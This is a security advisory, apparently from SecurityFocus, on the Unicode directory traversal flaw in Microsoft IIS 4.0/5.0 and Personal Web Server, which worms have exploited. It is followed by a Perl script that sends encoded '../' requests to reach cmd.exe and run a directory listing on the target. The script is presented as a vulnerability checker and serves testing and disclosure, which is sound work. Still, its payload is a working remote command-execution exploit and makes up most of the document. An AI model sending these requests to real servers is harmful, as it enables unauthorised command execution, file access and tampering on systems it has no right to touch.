source: http://www.securityfocus.com/bid/1806/info
 
Microsoft IIS 4.0 and 5.0 are both vulnerable to double dot "../" directory traversal exploitation if extended UNICODE character representations are used in substitution for "/" and "\".
 
Unauthenticated users may access any known file in the context of the IUSR_machinename account. The IUSR_machinename account is a member of the Everyone and Users groups by default, therefore, any file on the same logical drive as any web-accessible file that is accessible to these groups can be deleted, modified, or executed. Successful exploitation would yield the same privileges as a user who could successfully log onto the system to a remote user possessing no credentials whatsoever.
 
It has been discovered that a Windows 98 host running Microsoft Personal Web Server is also subject to this vulnerability. (March 18, 2001)
 
This is the vulnerability exploited by the Code Blue Worm.
 
**UPDATE**: It is believed that an aggressive worm may be in the wild that actively exploits this vulnerability.

#!/usr/bin/perl
# Very simple PERL script to test a machine for Unicode vulnerability. 
# Use port number with SSLproxy for testing SSL sites
# Usage: unicodecheck IP:port
# Only makes use of "Socket" library
# Roelof Temmingh 2000/10/21
# roelof@sensepost.com http://www.sensepost.com

use Socket;
# --------------init
if ($#ARGV<0) {die "Usage: unicodecheck IP:port\n";}
($host,$port)=split(/:/,@ARGV[0]);
print "Testing $host:$port : ";
$target = inet_aton($host);
$flag=0;
# ---------------test method 1
my @results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}
# ---------------test method 2
my @results=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}
# ---------------result
if ($flag==1){print "Vulnerable\n";}
else {print "Safe\n";}
# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}
# Spidermark: sensepostdata